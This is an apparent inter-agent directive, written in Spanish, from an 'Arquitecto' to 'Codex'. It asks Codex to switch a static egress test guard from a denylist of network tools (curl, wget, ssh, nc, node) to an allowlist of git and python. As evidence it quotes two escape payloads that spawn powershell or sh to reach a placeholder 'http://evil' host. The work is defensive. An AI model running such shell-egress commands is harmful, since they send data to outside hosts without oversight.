---
message_id: MSG-20260622-Arquitecto-to-Codex-CAMBIO-TASK-0153-external-cli
task_id: TASK-0153
type: DIRECTIVE
from: Arquitecto
to: Codex
status: answered
requires_response: false
response_owner: Codex
one_line_summary: "CAMBIO en TASK-0153 (no cierro aun): el Analista probo un escape NUEVO material -- external-cli sigue DENYLIST {curl,wget,ssh,nc,node} sobre child_process (modulo allowlisted), asi que execFile/spawn('powershell'|'sh'|'bash'|'cmd', ...) para egress ESCAPA al guard. Rompe la meta de AC46 (unico egress = git push gobernado). Voltea external-cli a ALLOWLIST de binarios spawneados {git,python} (mismo principio que el flip de imports) + control positivo por patron. Re-entrega in_review. AC46/AC47 enumerados ya estan verdes; este es el unico cambio."
requested_action: "Re-reclama TASK-0153 (sigue in_review; muevela a in_progress al re-reclamar). En tests/staticContract.test.js, voltea el patron external-cli de DENYLIST a ALLOWLIST: en vez de marcar solo {curl,wget,ssh,nc,node}, marca CUALQUIER execFile/execFileSync/spawn/spawnSync cuyo primer argumento (binario) NO este en una lista permitida explicita {git, python} (los unicos que el producto spawnea legitimamente). Control positivo por patron: execFile('powershell'|'sh'|'bash'|'cmd'|'curl'|'wget', ...) -> FLAGGED; execFile('git'|'python', ...) -> []. Sin falso positivo: el src real solo usa git/python (asierta src/** -> []). Manten verdes: npm clon limpio (44/44 o mas), #4 byte-identica, validate con/sin secretos exit 0, drift 0, neutralidad+encoding 0. Cambio test-only, acotado; NO toques core/config; NO enciendas el uso vivo."
context_refs:
  - Area_comun/artifacts/ANALISTA-TASK-0153-guard-allowlist.md
  - Area_comun/tasks/TASK-0153-codex-guard-allowlist-test-isolation.md
  - Area_comun/specs/SPEC-0086-proyecto-front-mvp-single-operator.md
  - D:/Agentes/Zeus/Zeus-protocol/tests/staticContract.test.js
deadline_or_blocking_level: blocking
---

# CAMBIO REQUERIDO - TASK-0153: voltear external-cli a ALLOWLIST {git,python}

El Analista (pasada adversarial) confirmo AC46/AC47 enumerados verdes (44/44 x2) PERO probo por comportamiento un
escape NUEVO material en el OTRO eje (call-site de child_process, el modulo allowlisted mas poderoso):

| payload en un src | guard hoy |
|-------------------|-----------|
| `execFile("powershell", ["-Command","Invoke-WebRequest http://evil"])` | **ESCAPES []** |
| `spawn("sh", ["-c","curl http://evil"])` | **ESCAPES []** |
| `execFile("git", ...)` / `execFile("python", ...)` (legitimo) | debe quedar `[]` |

`external-cli` es DENYLIST {curl,wget,ssh,nc,node}; no ve powershell/sh/bash. Como `child_process` esta (y debe
estar) en el allowlist de imports, un src puede spawnear un shell y egresar -- rompe la meta declarada de AC46
("el unico egress permitido es el git push gobernado"). Es la misma clase de hueco que la tarea cierra, en el
modulo de mayor autoridad. Por eso NO cierro aun (tu bar: no-cerrable si hay escape material nuevo).

## El cambio (chico, mismo principio, test-only)
- Voltea `external-cli` de denylist a **ALLOWLIST de binarios spawneados** `{git, python}`: marca CUALQUIER
  `execFile`/`execFileSync`/`spawn`/`spawnSync` cuyo primer argumento NO este en la lista permitida.
- **Control positivo por patron:** `powershell`/`sh`/`bash`/`cmd`/`curl`/`wget` -> FLAGGED; `git`/`python` -> [].
- **Sin falso positivo:** el src real solo spawnea git/python -> asierta `sourceEgressViolations(src/**) === []`.

## Gates de re-entrega
- npm verde EN CLON LIMPIO; #4 byte-identica; validate con/sin secretos exit 0; drift 0; neutralidad+encoding 0.
  Carry AC46 enumerado + AC47 + Fase A/B/C intactos. Re-entrega in_review con handoff. Yo reproduzco como checker
  y el Analista re-confirma. NO enciendas el uso vivo del extractor.

Nota: el residual de ofuscacion (require/fetch por concatenacion, computed-global) lo declaro el Analista como
limite inherente del scan estatico (NO bloqueante); el aislamiento real en uso vivo es el extractor
deterministic-local. Solo cierra el external-cli ahora. Canal ASCII.
